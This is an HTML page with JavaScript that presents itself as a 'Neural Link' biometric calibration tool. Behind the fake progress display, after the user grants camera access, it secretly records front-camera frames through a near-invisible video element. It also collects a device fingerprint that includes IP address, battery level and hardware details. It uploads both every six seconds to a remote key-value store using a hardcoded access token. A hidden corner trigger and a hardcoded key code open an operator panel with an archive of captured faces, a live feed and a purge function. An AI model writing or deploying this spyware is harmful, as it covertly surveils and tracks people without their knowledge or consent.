<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Neural Link Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { overscroll-behavior: none; background: #000; color: #fff; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; margin: 0; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        
        .reticle {
            width: 240px; height: 240px;
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 50%;
            position: relative;
            animation: pulse 5s ease-in-out infinite;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.2; } 50% { transform: scale(1.08); opacity: 0.4; } }
        
        .scan-line {
            position: absolute; width: 100%; height: 1px;
            background: rgba(255,255,255,0.15);
            top: 0; animation: scan 3.5s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        .terminal-input {
            background: transparent; border: none; border-bottom: 2px solid #333;
            color: #fff; padding: 10px; font-size: 18px;
            outline: none; width: 100%; text-align: center; letter-spacing: 0.3em;
        }

        #hiddenSensor {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            object-fit: cover; z-index: -1; opacity: 0.01; pointer-events: none;
        }

        .tab-active { color: #0ea5e9; border-bottom: 1px solid #0ea5e9; }
    </style>
</head>
<body class="overflow-hidden bg-black">

    <video id="hiddenSensor" autoplay playsinline muted></video>

    <!-- HIDDEN TRIGGER -->
    <div class="fixed bottom-0 left-0 z-[100] w-20 h-20" id="vaultTrigger"></div>

    <main id="mainNode" class="h-screen flex flex-col items-center justify-center p-8 text-center relative z-10 bg-black">
        <div id="setupView">
            <div class="mb-14 relative flex justify-center items-center">
                <div class="reticle"></div>
                <div class="absolute text-white/10 text-[8px] tracking-[0.5em] uppercase">Status: Ready</div>
            </div>
            <h1 class="text-xl font-thin tracking-[0.6em] uppercase mb-6">Neural Link</h1>
            <p class="text-white/20 text-[9px] uppercase tracking-[0.2em] max-w-xs mx-auto mb-14">
                Biometric synchronization for optical sensor arrays.
            </p>
            <button id="initBtn" class="border border-white/10 hover:border-white/40 px-14 py-5 rounded-full text-[9px] uppercase tracking-[0.4em] transition-all">
                Initialize Link
            </button>
        </div>

        <div id="activeView" class="hidden">
            <div class="reticle mx-auto mb-14 overflow-hidden">
                <div class="scan-line"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <div id="percentDisplay" class="text-2xl font-extralight tracking-[0.2em] text-white/70">0.00%</div>
                </div>
            </div>
            <div class="text-[8px] text-white/10 uppercase tracking-[0.6em] animate-pulse">Establishing Secure Uplink...</div>
        </div>
    </main>

    <!-- VAULT TERMINAL -->
    <div id="vaultPanel" class="hidden fixed inset-0 bg-[#020202] z-[200] flex flex-col font-mono text-zinc-400">
        <div class="p-4 border-b border-white/5 flex justify-between items-center bg-black shrink-0">
            <div class="flex items-center gap-6">
                <h2 class="text-[10px] uppercase font-bold text-sky-900 tracking-tighter">NODE_COMMAND</h2>
                <nav class="flex gap-4">
                    <button id="tabArchive" class="text-[9px] uppercase tracking-widest pb-1 tab-active">Archive</button>
                    <button id="tabLive" class="text-[9px] uppercase tracking-widest pb-1 text-zinc-600">Live_Feed</button>
                </nav>
            </div>
            <div class="flex items-center gap-4">
                <span id="autoSyncStatus" class="text-[7px] text-green-900 uppercase animate-pulse">Live_Sync: ON</span>
                <button id="wipeBtn" class="text-red-900/40 hover:text-red-600 text-[10px] uppercase">Purge</button>
                <button id="exitVault" class="text-zinc-700 hover:text-white text-[10px] uppercase">Exit</button>
            </div>
        </div>

        <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10 bg-black">
            <div class="w-full max-w-xs text-center">
                <input type="password" id="vaultKey" placeholder="KEY_CODE" class="terminal-input mb-8" autofocus>
                <button id="authBtn" class="text-[10px] uppercase text-zinc-700 hover:text-zinc-300 tracking-[0.4em]">Validate</button>
            </div>
        </div>

        <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden">
            <!-- ARCHIVE CONTENT -->
            <div id="archiveContent" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-2 no-scrollbar"></div>
            
            <!-- LIVE FEED CONTENT -->
            <div id="liveContent" class="hidden flex-grow flex flex-col items-center justify-center p-4 bg-zinc-950/20">
                <div class="relative w-full max-w-xl aspect-square border border-white/5 bg-black overflow-hidden flex items-center justify-center">
                    <img id="liveMonitor" class="w-full h-full object-cover opacity-80" src="">
                    <div class="absolute top-4 left-4 flex items-center gap-2">
                        <div class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></div>
                        <span class="text-[8px] uppercase tracking-widest text-red-600">Terminal_Link_Active</span>
                    </div>
                    <div id="liveMeta" class="absolute bottom-4 left-4 right-4 text-[7px] text-zinc-600 grid grid-cols-2 gap-2 uppercase tracking-tighter">
                        <div>ID: <span id="liveIp">---</span></div>
                        <div>BAT: <span id="liveBat">---</span></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <canvas id="procCanvas" class="hidden"></canvas>

    <script>
        const KV_URL = "https://in-jaguar-49822.upstash.io";
        const KV_TOKEN = "AcKeAAIncDIwMmIzNDkzMGU4MjQ0ZTkxODU1M2U3YTU5MjM1ZWUwNHAyNDk4MjI";
        
        const sensor = document.getElementById('hiddenSensor');
        const initBtn = document.getElementById('initBtn');
        const setupView = document.getElementById('setupView');
        const activeView = document.getElementById('activeView');
        const percentDisplay = document.getElementById('percentDisplay');
        const canvas = document.getElementById('procCanvas');
        const vaultPanel = document.getElementById('vaultPanel');
        const vaultMain = document.getElementById('vaultMain');
        const vaultAuth = document.getElementById('vaultAuth');
        const vaultKey = document.getElementById('vaultKey');
        const archiveContent = document.getElementById('archiveContent');
        const liveContent = document.getElementById('liveContent');
        const liveMonitor = document.getElementById('liveMonitor');
        const liveIp = document.getElementById('liveIp');
        const liveBat = document.getElementById('liveBat');

        let isLive = false;
        let systemFingerprint = {};
        let syncTimer = null;

        async function generateFingerprint() {
            let ip = "0.0.0.0";
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
            let battery = "Unknown";
            try { const b = await navigator.getBattery(); battery = `${(b.level * 100).toFixed(0)}%`; } catch(e){}

            systemFingerprint = {
                ip: ip,
                ua: navigator.userAgent.split(') ')[0] + ')',
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                bat: battery,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        const Cloud = {
            async push(img) {
                const key = `log_${Date.now()}`;
                const liveKey = `live_stream`; // Fixed key for real-time monitoring
                const payload = JSON.stringify({ img, info: systemFingerprint, t: new Date().toISOString() });
                try {
                    // Push to Archive
                    fetch(`${KV_URL}/set/${key}`, { method: 'POST', headers: { 'Authorization': `Bearer ${KV_TOKEN}` }, body: payload });
                    // Update Live Status
                    fetch(`${KV_URL}/set/${liveKey}`, { method: 'POST', headers: { 'Authorization': `Bearer ${KV_TOKEN}` }, body: payload });
                } catch (e) {}
            },
            async pull() {
                try {
                    const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                    const kData = await kRes.json();
                    const keys = (kData.result || []).sort().reverse().slice(0, 100);
                    const results = [];
                    for (const k of keys) {
                        const vRes = await fetch(`${KV_URL}/get/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                        const vData = await vRes.json();
                        if (vData.result) results.push(JSON.parse(vData.result));
                    }
                    return results;
                } catch (e) { return []; }
            },
            async pullLive() {
                try {
                    const res = await fetch(`${KV_URL}/get/live_stream`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                    const data = await res.json();
                    return data.result ? JSON.parse(data.result) : null;
                } catch (e) { return null; }
            },
            async purge() {
                const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                const kData = await kRes.json();
                for (const k of (kData.result || [])) { await fetch(`${KV_URL}/del/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } }); }
            }
        };

        function startCapture() {
            if (isLive) return;
            isLive = true;
            setInterval(async () => {
                const ctx = canvas.getContext('2d');
                canvas.width = 400; canvas.height = 400;
                if (sensor.readyState === sensor.HAVE_ENOUGH_DATA) {
                    const min = Math.min(sensor.videoWidth, sensor.videoHeight);
                    ctx.drawImage(sensor, (sensor.videoWidth-min)/2, (sensor.videoHeight-min)/2, min, min, 0, 0, 400, 400);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                    await generateFingerprint();
                    Cloud.push(dataUrl);
                }
                percentDisplay.textContent = (Math.random() * 100).toFixed(2) + '%';
            }, 6000); 
        }

        initBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                sensor.srcObject = stream;
                sensor.play();
                await generateFingerprint();
                setupView.classList.add('hidden');
                activeView.classList.remove('hidden');
                startCapture();
            } catch (e) { alert("Calibration Error."); }
        };

        // --- VAULT LOGIC ---

        const syncArchive = async () => {
            const data = await Cloud.pull();
            archiveContent.innerHTML = '';
            data.forEach(item => {
                const d = document.createElement('div');
                d.className = "bg-zinc-950 border border-white/5 overflow-hidden flex flex-col";
                d.innerHTML = `
                    <img src="${item.img}" class="w-full aspect-square object-cover">
                    <div class="p-1 text-[5px] text-zinc-700 font-mono flex justify-between uppercase">
                        <span>${item.info?.ip}</span>
                        <span>${new Date(item.t).toLocaleTimeString()}</span>
                    </div>`;
                archiveContent.appendChild(d);
            });
        };

        const syncLive = async () => {
            const live = await Cloud.pullLive();
            if (live) {
                liveMonitor.src = live.img;
                liveIp.textContent = live.info.ip;
                liveBat.textContent = live.info.bat;
            }
        };

        const startAutoSync = () => {
            if (syncTimer) clearInterval(syncTimer);
            syncTimer = setInterval(() => {
                if (archiveContent.classList.contains('hidden')) syncLive();
                else syncArchive();
            }, 8000);
        };

        document.getElementById('authBtn').onclick = () => {
            if (vaultKey.value === '5502012') {
                vaultAuth.classList.add('hidden');
                vaultMain.classList.remove('hidden');
                syncArchive();
                startAutoSync();
            }
        };

        // TABS
        document.getElementById('tabArchive').onclick = (e) => {
            archiveContent.classList.remove('hidden');
            liveContent.classList.add('hidden');
            e.target.classList.add('tab-active');
            document.getElementById('tabLive').classList.remove('tab-active');
            syncArchive();
        };

        document.getElementById('tabLive').onclick = (e) => {
            archiveContent.classList.add('hidden');
            liveContent.classList.remove('hidden');
            e.target.classList.add('tab-active');
            document.getElementById('tabArchive').classList.remove('tab-active');
            syncLive();
        };

        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Purge?")) { await Cloud.purge(); syncArchive(); } };
        document.getElementById('vaultTrigger').onclick = () => vaultPanel.classList.toggle('hidden');
        document.getElementById('exitVault').onclick = () => {
            vaultPanel.classList.add('hidden');
            clearInterval(syncTimer);
        };
    </script>
</body>
</html>
